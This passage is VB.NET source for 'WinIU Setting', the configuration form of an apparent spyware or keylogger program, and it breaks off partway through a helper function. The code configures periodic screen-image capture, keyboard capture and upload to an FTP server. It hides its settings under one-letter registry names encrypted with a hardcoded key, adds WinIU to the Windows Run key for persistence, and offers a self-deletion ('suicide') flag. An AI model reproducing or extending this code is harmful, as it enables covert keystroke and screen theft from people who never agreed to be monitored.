Imports System.Xml

Public Class FrmMain

#Region "定数"

    ''' <summary>
    ''' MD5用パスワード
    ''' </summary>
    ''' <remarks></remarks>
    Private Const CONST_MD5_PASSWORD As String = "BURIGADEN19960423"

    ''' <summary>
    ''' プロジェクトWinIUのProduct Name
    ''' </summary>
    ''' <remarks></remarks>
    Private Const CONST_PRODUCT_NAME As String = "WinIU"

    ''' <summary>
    ''' 設定XMLファイルのルートエレメントの名前
    ''' </summary>
    ''' <remarks></remarks>
    Private Const CONST_XML_ROOT_ELEMENT_NAME As String = "Settings"

    ''' <summary>
    ''' デフォルトの設定ファイル名
    ''' </summary>
    ''' <remarks></remarks>
    Private Const CONST_DEFAULT_OUTPUT_FILE_NAME As String = "Settings.xml"

#End Region

#Region "列挙体"

    ''' <summary>
    ''' 設定レジストリ名
    ''' </summary>
    ''' <remarks></remarks>
    Private Enum EnumRegName
        SERVER      ' サーバー名
        USER        ' ユーザー名
        PASSWORD    ' パスワード
        IMG_DIR     ' 画像ディレクトリ
        KEY_DIR     ' キーボードディレクトリ
        FILE_DIR    ' ファイル・ディレクトリ
        RUN         ' 実行許可
        SECOND      ' 秒
        KEY_RUN     ' キーボードキャプチャ実行許可
        KEY_SECOND  ' キーボードキャプチャ秒
        FTP_RUN     ' ファイル読込実行許可
        FTP_SECOND  ' ファイル読込秒
        IS_DELETE   ' 自殺するかどうか
    End Enum

#End Region

#Region "プロパティ"

    ''' <summary>
    ''' サーバー名
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property Server As String
        Get
            Return Me.GetRegistry(EnumRegName.SERVER)
        End Get
        Set(value As String)
            Me.SetRegistry(EnumRegName.SERVER, value)
        End Set
    End Property

    ''' <summary>
    ''' ユーザー名
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property User As String
        Get
            Return Me.GetRegistry(EnumRegName.USER)
        End Get
        Set(value As String)
            Me.SetRegistry(EnumRegName.USER, value)
        End Set
    End Property

    ''' <summary>
    ''' パスワード
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property Password As String
        Get
            Return Me.GetRegistry(EnumRegName.PASSWORD)
        End Get
        Set(value As String)
            Me.SetRegistry(EnumRegName.PASSWORD, value)
        End Set
    End Property

    ''' <summary>
    ''' 画像ディレクトリ
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property ImgDir As String
        Get
            Return Me.GetRegistry(EnumRegName.IMG_DIR)
        End Get
        Set(value As String)
            Me.SetRegistry(EnumRegName.IMG_DIR, value)
        End Set
    End Property

    ''' <summary>
    ''' キーボードディレクトリ
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property KeyDir As String
        Get
            Return Me.GetRegistry(EnumRegName.KEY_DIR)
        End Get
        Set(value As String)
            Me.SetRegistry(EnumRegName.KEY_DIR, value)
        End Set
    End Property

    ''' <summary>
    ''' ファイルディレクトリ
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property FileDir As String
        Get
            Return Me.GetRegistry(EnumRegName.FILE_DIR)
        End Get
        Set(value As String)
            Me.SetRegistry(EnumRegName.FILE_DIR, value)
        End Set
    End Property

    ''' <summary>
    ''' 実行許可
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property Run As Boolean
        Get
            Return Me.Int2Bool(Me.Str2Int(Me.GetRegistry(EnumRegName.RUN)))
        End Get
        Set(value As Boolean)
            Me.SetRegistry(EnumRegName.RUN, Me.Bool2Int(value).ToString)
        End Set
    End Property

    ''' <summary>
    ''' 秒
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property Second As Integer
        Get
            Return Me.Str2Int(Me.GetRegistry(EnumRegName.SECOND))
        End Get
        Set(value As Integer)
            Me.SetRegistry(EnumRegName.SECOND, value.ToString)
        End Set
    End Property

    ''' <summary>
    ''' キーボード実行許可
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property KeyRun As Boolean
        Get
            Return Me.Int2Bool(Me.Str2Int(Me.GetRegistry(EnumRegName.KEY_RUN)))
        End Get
        Set(value As Boolean)
            Me.SetRegistry(EnumRegName.KEY_RUN, Me.Bool2Int(value).ToString)
        End Set
    End Property

    ''' <summary>
    ''' キーボードキャプチャ秒
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property KeySecond As Integer
        Get
            Return Me.Str2Int(Me.GetRegistry(EnumRegName.KEY_SECOND))
        End Get
        Set(value As Integer)
            Me.SetRegistry(EnumRegName.KEY_SECOND, value.ToString)
        End Set
    End Property

    ''' <summary>
    ''' FTP側ファイル読込実行許可
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property FtpRun As Boolean
        Get
            Return Me.Int2Bool(Me.Str2Int(Me.GetRegistry(EnumRegName.FTP_RUN)))
        End Get
        Set(value As Boolean)
            Me.SetRegistry(EnumRegName.FTP_RUN, Me.Bool2Int(value).ToString)
        End Set
    End Property

    ''' <summary>
    ''' FTP側ファイル読込秒
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property FtpSecond As Integer
        Get
            Return Me.Str2Int(Me.GetRegistry(EnumRegName.FTP_SECOND))
        End Get
        Set(value As Integer)
            Me.SetRegistry(EnumRegName.FTP_SECOND, value.ToString)
        End Set
    End Property

    ''' <summary>
    ''' 自殺するかどうか
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property IsDelete As Boolean
        Get
            Return Me.Int2Bool(Me.Str2Int(Me.GetRegistry(EnumRegName.IS_DELETE)))
        End Get
        Set(value As Boolean)
            Me.SetRegistry(EnumRegName.IS_DELETE, Me.Bool2Int(value).ToString)
        End Set
    End Property

    ''' <summary>
    ''' レジストリ名一覧
    ''' </summary>
    ''' <remarks></remarks>
    Private RegNameList As New Dictionary(Of EnumRegName, String)

    ''' <summary>
    ''' WinIU.exeのインストールディレクトリ
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Property AutoRunDir As String
        Get
            Return Me.GetAutoRunRegistry
        End Get
        Set(value As String)
            Me.SetAutoRunRegistry(value)
        End Set
    End Property

#End Region

#Region "コンストラクタ"

    Public Sub New()

        ' この呼び出しはデザイナーで必要です。
        InitializeComponent()

        ' InitializeComponent() 呼び出しの後で初期化を追加します。
        Try
            ' Enum番号とレジストリ名の紐付け
            With Me.RegNameList
                .Add(EnumRegName.IMG_DIR, "a")
                .Add(EnumRegName.KEY_DIR, "b")
                .Add(EnumRegName.FILE_DIR, "c")
                .Add(EnumRegName.PASSWORD, "d")
                .Add(EnumRegName.SERVER, "e")
                .Add(EnumRegName.USER, "f")
                .Add(EnumRegName.RUN, "g")
                .Add(EnumRegName.SECOND, "h")
                .Add(EnumRegName.KEY_RUN, "i")
                .Add(EnumRegName.KEY_SECOND, "j")
                .Add(EnumRegName.FTP_RUN, "k")
                .Add(EnumRegName.FTP_SECOND, "l")
                .Add(EnumRegName.IS_DELETE, "m")
            End With

            Me.ContrlInit()
        Catch
        End Try
    End Sub

#End Region

#Region "設定用レジストリ関連"

    ''' <summary>
    ''' 設定用レジストリの値を取得する
    ''' </summary>
    ''' <param name="prmEnum"></param>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Function GetRegistry(prmEnum As EnumRegName) As String
        Dim key As String = "Software\" & My.Application.Info.CompanyName & "\" & FrmMain.CONST_PRODUCT_NAME
        Dim name As String = Me.RegNameList(prmEnum)
        Dim reg_key As Microsoft.Win32.RegistryKey = Nothing
        Dim ret As String = String.Empty
        Try
            ' キーを開く
            reg_key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(key)

            ' 値を取得
            If reg_key.GetValue(name) IsNot Nothing Then
                ret = WinIUCrypt.CryptMd5.DecryptString(DirectCast(reg_key.GetValue(name), String), FrmMain.CONST_MD5_PASSWORD)
            End If

            ' 閉じる
            reg_key.Close()
        Catch ex As Exception
            ' 閉じる
            If Not reg_key Is Nothing Then
                reg_key.Close()
            End If
        End Try

        ' 値を返す
        Return ret
    End Function

    ''' <summary>
    ''' 設定用レジストリの値を設定する
    ''' </summary>
    ''' <param name="prmEnum"></param>
    ''' <remarks></remarks>
    Private Sub SetRegistry(prmEnum As EnumRegName, prmVal As String)
        Dim key As String = "Software\" & My.Application.Info.CompanyName & "\" & FrmMain.CONST_PRODUCT_NAME
        Dim name As String = Me.RegNameList(prmEnum)
        Dim reg_key As Microsoft.Win32.RegistryKey = Nothing
        Dim ret As String = String.Empty
        Try
            ' キーを開く
            reg_key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(key, False)

            ' 値を設定
            reg_key.SetValue(name, WinIUCrypt.CryptMd5.EncryptString(prmVal, FrmMain.CONST_MD5_PASSWORD))

            ' 閉じる
            reg_key.Close()
        Catch ex As Exception
            ' 閉じる
            If Not reg_key Is Nothing Then
                reg_key.Close()
            End If
        End Try
    End Sub

    ''' <summary>
    ''' 設定用レジストリを削除する
    ''' </summary>
    ''' <param name="prmEnum"></param>
    ''' <remarks></remarks>
    Private Overloads Sub CleanRegistry(prmEnum As EnumRegName)
        Dim key As String = "Software\" & My.Application.Info.CompanyName & "\" & FrmMain.CONST_PRODUCT_NAME
        Dim name As String = Me.RegNameList(prmEnum)
        Dim reg_key As Microsoft.Win32.RegistryKey = Nothing
        Dim ret As String = String.Empty
        Try
            ' キーを開く
            reg_key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(key, False)

            ' キーを削除
            reg_key.DeleteValue(name)

            ' 閉じる
            reg_key.Close()
        Catch ex As Exception
            ' 閉じる
            If Not reg_key Is Nothing Then
                reg_key.Close()
            End If
        End Try
    End Sub

    ''' <summary>
    ''' 設定用レジストリを一括削除する
    ''' </summary>
    ''' <remarks></remarks>
    Private Overloads Sub CleanRegistry()
        Dim key As String = "Software\" & My.Application.Info.CompanyName
        Dim reg_key As Microsoft.Win32.RegistryKey = Nothing
        Try
            ' キーを開く
            reg_key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(key, False)

            ' キーを削除
            reg_key.DeleteSubKeyTree(FrmMain.CONST_PRODUCT_NAME)

            ' 閉じる
            reg_key.Close()
        Catch ex As Exception
            ' 閉じる
            If Not reg_key Is Nothing Then
                reg_key.Close()
            End If
        End Try
    End Sub

    ''' <summary>
    ''' 自動実行用レジストリを取得する
    ''' </summary>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Function GetAutoRunRegistry() As String
        Dim reg_key As Microsoft.Win32.RegistryKey = Nothing
        Dim key As String = "Software\Microsoft\Windows\CurrentVersion\Run"
        Dim ret As String = String.Empty

        Try
            ' キーを開く
            reg_key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(key)

            ' 値を取得
            ret = reg_key.GetValue(FrmMain.CONST_PRODUCT_NAME)

            ' 閉じる
            reg_key.Close()
        Catch ex As Exception
            ' 閉じる
            If reg_key IsNot Nothing Then
                reg_key.Close()
            End If

            ret = String.Empty
        End Try

        Return ret
    End Function

    ''' <summary>
    ''' 自動実行用レジストリを設定する
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub SetAutoRunRegistry(prmDir As String)
        Dim reg_key As Microsoft.Win32.RegistryKey = Nothing
        Dim key As String = "Software\Microsoft\Windows\CurrentVersion\Run"

        Try
            ' キーを開く
            reg_key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(key, False)

            ' 値を設定
            reg_key.SetValue(FrmMain.CONST_PRODUCT_NAME, prmDir)

            ' 閉じる
            reg_key.Close()
        Catch ex As Exception
            ' 閉じる
            If reg_key IsNot Nothing Then
                reg_key.Close()
            End If
        End Try
    End Sub

    ''' <summary>
    ''' 自動実行用レジストリを削除する
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub CleanAutoRunRegistry()
        Dim reg_key As Microsoft.Win32.RegistryKey = Nothing
        Dim key As String = "Software\Microsoft\Windows\CurrentVersion\Run"

        Try
            ' キーを開く
            reg_key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(key, False)

            ' 値を削除
            reg_key.DeleteValue(FrmMain.CONST_PRODUCT_NAME)

            ' 閉じる
            reg_key.Close()
        Catch ex As Exception
            ' 閉じる
            If reg_key IsNot Nothing Then
                reg_key.Close()
            End If
        End Try
    End Sub

#End Region

#Region "イベント"

    ''' <summary>
    ''' 適用ボタン押下イベント
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Private Sub btnApply_Click(sender As System.Object, e As System.EventArgs) Handles btnApply.Click
        Try
            ' カーソルを変更
            Cursor.Current = Cursors.WaitCursor

            ' タイマー値バリデート
            If (Me.Str2Int(Me.txtInterval.Text) > Int32.MaxValue Or Me.Str2Int(Me.txtInterval.Text) <= 0) _
            Or (Me.Str2Int(Me.txtKeyInterval.Text) > Int32.MaxValue Or Me.Str2Int(Me.txtKeyInterval.Text) <= 0) _
            Or (Me.Str2Int(Me.txtFTPInterval.Text) > Int32.MaxValue Or Me.Str2Int(Me.txtFTPInterval.Text) <= 0) Then
                MessageBox.Show("Is not correct interval.")
                Exit Sub
            End If

            ' 接続テスト
            If Not Me.ConnectServerTest(Me.txtImgDir.Text) OrElse Not Me.ConnectServerTest(Me.txtKeyDir.Text) OrElse Not Me.ConnectServerTest(Me.txtFileDir.Text) Then
                If MessageBox.Show(String.Concat("Failed to connect to the server!", vbCrLf, "Do you want to be saved?"), "Caution!!", MessageBoxButtons.YesNo) = Windows.Forms.DialogResult.No Then
                    Exit Sub
                End If
            End If

            ' WinIU.exeの存在確認
            If Not System.IO.File.Exists(Me.txtAutoRunDir.Text) Then
                If MessageBox.Show(String.Concat("WinIU.exe does not exist in the specified directory.", vbCrLf, "Would you like?"), "Caution!!", MessageBoxButtons.YesNo) = Windows.Forms.DialogResult.No Then
                    Exit Sub
                End If
            End If

            ' データの保存
            Me.ControlSave()

            ' 通知
            MessageBox.Show("Successfully.", Me.Text, MessageBoxButtons.OK)
        Catch ex As Exception

        Finally
            ' カーソルを戻す
            Cursor.Current = Cursors.Default
        End Try
    End Sub

    ''' <summary>
    ''' 元に戻すボタン押下イベント
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Private Sub btnRestore_Click(sender As System.Object, e As System.EventArgs) Handles btnRestore.Click
        Try
            ' カーソルを変更
            Cursor.Current = Cursors.WaitCursor

            ' コントロールの初期化
            Me.ContrlInit()

            ' 通知
            MessageBox.Show("Successfully.", Me.Text, MessageBoxButtons.OK)
        Catch ex As Exception

        Finally
            ' カーソルを戻す
            Cursor.Current = Cursors.Default
        End Try
    End Sub

    ''' <summary>
    ''' 画像　接続テストボタン押下イベント
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Private Sub btnTestConnect_Click(sender As System.Object, e As System.EventArgs) Handles btnImgTestConnect.Click, btnKeyTestConnect.Click, btnFileTestConnect.Click
        Try
            Dim dir As String = String.Empty

            Select Case DirectCast(sender, Button).Name
                Case "btnImgTestConnect"
                    dir = Me.txtImgDir.Text
                Case "btnKeyTestConnect"
                    dir = Me.txtKeyDir.Text
                Case "btnFileTestConnect"
                    dir = Me.txtFileDir.Text
            End Select

            ' カーソルを変更
            Cursor.Current = Cursors.WaitCursor
            If Me.ConnectServerTest(dir) Then
                MessageBox.Show("Successfully connected to the server.", "Connect Test", MessageBoxButtons.OK)
            Else
                MessageBox.Show("Failed to connect to the server!", "Connect Test", MessageBoxButtons.OK)
            End If
        Catch ex As Exception

        Finally
            ' カーソルを戻す
            Cursor.Current = Cursors.Default
        End Try
    End Sub

    ''' <summary>
    ''' 設定用レジストリを削除する
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Private Sub btnClean_Click(sender As System.Object, e As System.EventArgs) Handles btnClean.Click
        Try
            ' カーソルを変更
            Cursor.Current = Cursors.WaitCursor

            ' 警告メッセージ
            If MessageBox.Show(String.Concat("Remove the registry of all of WinIU related.", vbCrLf, "Would you like?"), "Caution!!", MessageBoxButtons.OKCancel) = Windows.Forms.DialogResult.Cancel Then
                Exit Sub
            End If

            ' レジストリ削除
            Me.DeleteRegistryWinIU()

            ' コントロールの初期化
            Me.ContrlInit()

            ' 通知
            MessageBox.Show("Successfully.", Me.Text, MessageBoxButtons.OK)
        Catch ex As Exception

        Finally
            ' カーソルを戻す
            Cursor.Current = Cursors.Default
        End Try
    End Sub

    ''' <summary>
    ''' WinIU.exe選択ボタン押下イベント
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Private Sub btnBrowsAutoRunDir_Click(sender As System.Object, e As System.EventArgs) Handles btnBrowsAutoRunDir.Click
        Try
            Dim ofd As New OpenFileDialog

            ofd.FileName = "WinIU.exe"
            ofd.Filter = "WinIU|WinIU.exe|All Files(*.*)|*.*"
            ofd.Title = "Please select a file to open."

            ' ダイアログを表示する
            If ofd.ShowDialog() = DialogResult.OK Then
                Me.txtAutoRunDir.Text = ofd.FileName
            End If
        Catch
        End Try
    End Sub

    ''' <summary>
    ''' メニュー開く押下イベント
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Private Sub ImportToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ImportToolStripMenuItem.Click
        Try
            ' ファイル保存ダイアログを準備
            Dim sfd As New SaveFileDialog
            With sfd
                .FileName = FrmMain.CONST_DEFAULT_OUTPUT_FILE_NAME
                .Filter = "XML File(*.xml)|*.xml"
                .Title = "Select Save File Directory"
                .RestoreDirectory = True
            End With

            ' ダイアログを開く
            If sfd.ShowDialog <> Windows.Forms.DialogResult.OK Then
                Exit Sub
            End If

            ' カーソルを変更
            Cursor.Current = Cursors.WaitCursor

            ' XML書き込み準備
            Dim xws As New XmlWriterSettings
            With xws
                .Indent = True
                .IndentChars = "    "
            End With

            ' XMLを書き込む
            Using xw As XmlWriter = XmlWriter.Create(sfd.FileName, xws)
                With xw
                    .WriteStartElement(FrmMain.CONST_XML_ROOT_ELEMENT_NAME)
                    .WriteElementString(Me.RegNameList(EnumRegName.IMG_DIR), WinIUCrypt.CryptMd5.EncryptString(Me.txtImgDir.Text, FrmMain.CONST_MD5_PASSWORD))
                    .WriteElementString(Me.RegNameList(EnumRegName.KEY_DIR), WinIUCrypt.CryptMd5.EncryptString(Me.txtKeyDir.Text, FrmMain.CONST_MD5_PASSWORD))
                    .WriteElementString(Me.RegNameList(EnumRegName.FILE_DIR), WinIUCrypt.CryptMd5.EncryptString(Me.txtFileDir.Text, FrmMain.CONST_MD5_PASSWORD))
                    .WriteElementString(Me.RegNameList(EnumRegName.PASSWORD), WinIUCrypt.CryptMd5.EncryptString(Me.txtPassword.Text, FrmMain.CONST_MD5_PASSWORD))
                    .WriteElementString(Me.RegNameList(EnumRegName.SERVER), WinIUCrypt.CryptMd5.EncryptString(Me.txtAddress.Text, FrmMain.CONST_MD5_PASSWORD))
                    .WriteElementString(Me.RegNameList(EnumRegName.USER), WinIUCrypt.CryptMd5.EncryptString(Me.txtUser.Text, FrmMain.CONST_MD5_PASSWORD))
                    .WriteElementString(Me.RegNameList(EnumRegName.RUN), WinIUCrypt.CryptMd5.EncryptString(Me.Bool2Int(Me.chkRun.Checked), FrmMain.CONST_MD5_PASSWORD))
                    .WriteElementString(Me.RegNameList(EnumRegName.SECOND), WinIUCrypt.CryptMd5.EncryptString(Me.Str2Int(Me.txtInterval.Text), FrmMain.CONST_MD5_PASSWORD))
                    .WriteElementString(Me.RegNameList(EnumRegName.KEY_RUN), WinIUCrypt.CryptMd5.EncryptString(Me.Bool2Int(Me.chkKeyRun.Checked), FrmMain.CONST_MD5_PASSWORD))
                    .WriteElementString(Me.RegNameList(EnumRegName.KEY_SECOND), WinIUCrypt.CryptMd5.EncryptString(Me.Str2Int(Me.txtKeyInterval.Text), FrmMain.CONST_MD5_PASSWORD))
                    .WriteElementString(Me.RegNameList(EnumRegName.FTP_RUN), WinIUCrypt.CryptMd5.EncryptString(Me.Bool2Int(Me.chkFTPRun.Checked), FrmMain.CONST_MD5_PASSWORD))
                    .WriteElementString(Me.RegNameList(EnumRegName.FTP_SECOND), WinIUCrypt.CryptMd5.EncryptString(Me.Str2Int(Me.txtFTPInterval.Text), FrmMain.CONST_MD5_PASSWORD))
                    .WriteElementString(Me.RegNameList(EnumRegName.IS_DELETE), WinIUCrypt.CryptMd5.EncryptString(Me.Bool2Int(Me.chkIsDelete.Checked), FrmMain.CONST_MD5_PASSWORD))
                    .WriteEndElement()
                    .Flush()
                End With
            End Using

            ' 通知
            MessageBox.Show("Successfully.", Me.Text, MessageBoxButtons.OK)
        Catch ex As Exception
            ' 通知
            MessageBox.Show("Failed.", Me.Text, MessageBoxButtons.OK)
        Finally
            ' カーソルを戻す
            Cursor.Current = Cursors.Default
        End Try
    End Sub

    ''' <summary>
    ''' メニュー保存押下イベント
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Private Sub ExportToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExportToolStripMenuItem.Click
        Try
            ' ファイルオープン用ダイアログを準備
            Dim ofd As New OpenFileDialog
            With ofd
                .FileName = FrmMain.CONST_DEFAULT_OUTPUT_FILE_NAME
                .Filter = "XML File(*.xml)|*.xml"
                .Title = "Select Open File Directory"
                .RestoreDirectory = True
            End With

            ' ダイアログを開く
            If ofd.ShowDialog <> Windows.Forms.DialogResult.OK Then
                Exit Sub
            End If

            ' カーソルを変更
            Cursor.Current = Cursors.WaitCursor

            ' XML読込準備
            Dim xrs As New XmlReaderSettings
            xrs.ConformanceLevel = ConformanceLevel.Document

            ' 読み込み先変数
            Dim writeList As New Dictionary(Of EnumRegName, String)
            With writeList
                .Add(EnumRegName.IMG_DIR, String.Empty)
                .Add(EnumRegName.KEY_DIR, String.Empty)
                .Add(EnumRegName.FILE_DIR, String.Empty)
                .Add(EnumRegName.PASSWORD, String.Empty)
                .Add(EnumRegName.SERVER, String.Empty)
                .Add(EnumRegName.USER, String.Empty)
                .Add(EnumRegName.RUN, "0")
                .Add(EnumRegName.SECOND, "0")
                .Add(EnumRegName.KEY_RUN, "0")
                .Add(EnumRegName.KEY_SECOND, "0")
                .Add(EnumRegName.FTP_RUN, "0")
                .Add(EnumRegName.FTP_SECOND, "0")
                .Add(EnumRegName.IS_DELETE, "0")
            End With

            ' ルート発見かどうか
            Dim isFindRoot As Boolean = False

            ' XML読込
            Using xr As XmlReader = XmlReader.Create(ofd.FileName)
                While (xr.Read)
                    ' 読み込んだノードがエレメント且つ読み込み用変数に用意されている場合
                    If xr.NodeType = XmlNodeType.Element And (Me.RegNameList.ContainsValue(xr.Name) Or xr.Name = CONST_XML_ROOT_ELEMENT_NAME) Then
                        If xr.Name = FrmMain.CONST_XML_ROOT_ELEMENT_NAME Then
                            isFindRoot = True
                        Else
                            ' 復号化して保存
                            writeList(Me.RegNameList.FirstOrDefault(Function(k As KeyValuePair(Of EnumRegName, String)) k.Value = xr.Name).Key) = WinIUCrypt.CryptMd5.DecryptString(xr.ReadElementContentAsString, FrmMain.CONST_MD5_PASSWORD)
                        End If
                    End If
                End While
            End Using

            ' 読み込んだ値をコントロールに設定
            If isFindRoot Then
                Me.txtImgDir.Text = writeList(EnumRegName.IMG_DIR)
                Me.txtKeyDir.Text = writeList(EnumRegName.KEY_DIR)
                Me.txtFileDir.Text = writeList(EnumRegName.FILE_DIR)
                Me.txtPassword.Text = writeList(EnumRegName.PASSWORD)
                Me.txtAddress.Text = writeList(EnumRegName.SERVER)
                Me.txtUser.Text = writeList(EnumRegName.USER)
                Me.chkRun.Checked = Me.Int2Bool(Me.Str2Int(writeList(EnumRegName.RUN)))
                Me.txtInterval.Text = writeList(EnumRegName.SECOND)
                Me.chkKeyRun.Checked = Me.Int2Bool(Me.Str2Int(writeList(EnumRegName.KEY_RUN)))
                Me.txtKeyInterval.Text = writeList(EnumRegName.KEY_SECOND)
                Me.chkFTPRun.Checked = Me.Int2Bool(Me.Str2Int(writeList(EnumRegName.FTP_RUN)))
                Me.txtFTPInterval.Text = writeList(EnumRegName.FTP_SECOND)
                Me.chkIsDelete.Checked = Me.Int2Bool(Me.Str2Int(writeList(EnumRegName.IS_DELETE)))
            End If

            ' 通知
            MessageBox.Show("Successfully.", Me.Text, MessageBoxButtons.OK)
        Catch ex As Exception
            ' 通知
            MessageBox.Show("Failed.", Me.Text, MessageBoxButtons.OK)
        Finally
            ' カーソルを戻す
            Cursor.Current = Cursors.Default
        End Try
    End Sub

    ''' <summary>
    ''' メニュー終了押下イベント
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Private Sub ExitXToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ExitXToolStripMenuItem.Click
        Try
            Me.Close()
        Catch
        End Try
    End Sub

    ''' <summary>
    ''' メニューアプリケーション情報押下イベント
    ''' </summary>
    ''' <param name="sender"></param>
    ''' <param name="e"></param>
    ''' <remarks></remarks>
    Private Sub InfoIToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles InfoIToolStripMenuItem.Click
        Try
            MessageBox.Show(String.Concat("WinIU Setting ver", My.Application.Info.Version.Major, ".", My.Application.Info.Version.Minor, ".", My.Application.Info.Version.Revision), "App Info", MessageBoxButtons.OK)
        Catch
        End Try
    End Sub

#End Region

#Region "非公開メソッド"

    ''' <summary>
    ''' コントロールを初期化する
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub ContrlInit()
        Try
            Me.txtAddress.Text = Me.Server
            Me.txtUser.Text = Me.User
            Me.txtPassword.Text = Me.Password
            Me.txtImgDir.Text = Me.ImgDir
            Me.txtKeyDir.Text = Me.KeyDir
            Me.txtFileDir.Text = Me.FileDir
            Me.chkRun.Checked = Me.Run
            Me.txtInterval.Text = Me.Second
            Me.chkKeyRun.Checked = Me.KeyRun
            Me.txtKeyInterval.Text = Me.KeySecond
            Me.chkFTPRun.Checked = Me.FtpRun
            Me.txtFTPInterval.Text = Me.FtpSecond
            Me.txtAutoRunDir.Text = Me.AutoRunDir
            Me.chkIsDelete.Checked = Me.IsDelete
        Catch
        End Try
    End Sub

    ''' <summary>
    ''' コントロールの内容を保存する
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub ControlSave()
        Try
            Me.Server = Me.txtAddress.Text
            Me.User = Me.txtUser.Text
            Me.Password = Me.txtPassword.Text
            Me.ImgDir = Me.txtImgDir.Text
            Me.KeyDir = Me.txtKeyDir.Text
            Me.FileDir = Me.txtFileDir.Text
            Me.Run = Me.chkRun.Checked
            Me.Second = Me.Str2Int(Me.txtInterval.Text)
            Me.KeyRun = Me.chkKeyRun.Checked
            Me.KeySecond = Me.Str2Int(Me.txtKeyInterval.Text)
            Me.FtpRun = Me.chkFTPRun.Checked
            Me.FtpSecond = Me.Str2Int(Me.txtFTPInterval.Text)
            Me.AutoRunDir = Me.txtAutoRunDir.Text
            Me.IsDelete = Me.chkIsDelete.Checked
        Catch
        End Try
    End Sub

    ''' <summary>
    ''' サーバーに接続してみる
    ''' </summary>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Function ConnectServerTest(prmDir As String)
        Dim ret As Boolean = False
        Try
            'ファイル一覧を取得するディレクトリのURI
            Dim ftp_uri As New Uri(String.Concat("ftp://", Me.txtAddress.Text, prmDir))

            ' FtpWebRequestの作成
            Dim ftpReq As System.Net.FtpWebRequest = CType(System.Net.WebRequest.Create(ftp_uri), System.Net.FtpWebRequest)

            ' ログインユーザー名とパスワードを設定
            ftpReq.Credentials = New System.Net.NetworkCredential(Me.txtUser.Text, Me.txtPassword.Text)
            ftpReq.Method = System.Net.WebRequestMethods.Ftp.ListDirectoryDetails

            ' 要求の完了後に接続を閉じる
            ftpReq.KeepAlive = False

            ' PASSIVEモードを無効にする
            ftpReq.UsePassive = False

            ' FtpWebResponseを取得
            Dim ftpRes As System.Net.FtpWebResponse = CType(ftpReq.GetResponse(), System.Net.FtpWebResponse)

            ' FTPサーバーから送信されたデータを取得
            Dim sr As New System.IO.StreamReader(ftpRes.GetResponseStream())
            Dim res As String = sr.ReadToEnd()

            sr.Close()

            ' 取得文字列が空、もしくはNothingであれば失敗、としよう！・・・ダメだった。Nothingだけでやる。
            If res Is Nothing Then
                ret = False
            Else
                ret = True
            End If

        Catch ex As Exception
            ret = False
        End Try

        Return ret
    End Function

    ''' <summary>
    ''' WinIU関連の全てのレジストリを削除する
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub DeleteRegistryWinIU()
        Try
            Me.CleanRegistry()
            Me.CleanAutoRunRegistry()
        Catch
        End Try
    End Sub

    ''' <summary>
    ''' String型をInteger型に変換する
    ''' </summary>
    ''' <param name="value"></param>
    ''' <returns></returns>
    ''' <remarks>変換不可の場合は0とする</remarks>
    Private Function Str2Int(value As String) As Integer
        Dim ret As Integer = 0

        Try
            Integer.TryParse(value, ret)
        Catch
        End Try

        Return ret
    End Function

    ''' <summary>
    ''' Bool型をInteger型に変換する
    ''' </summary>
    ''' <param name="value"></param>
    ''' <returns></returns>
    ''' <remarks>True:1 False:0</remarks>
    Private Function Bool2Int(value As Boolean) As Integer
        Dim ret As Integer = 0

        Try
            If value Then
                ret = 1
            End If
        Catch
        End Try

        Return ret
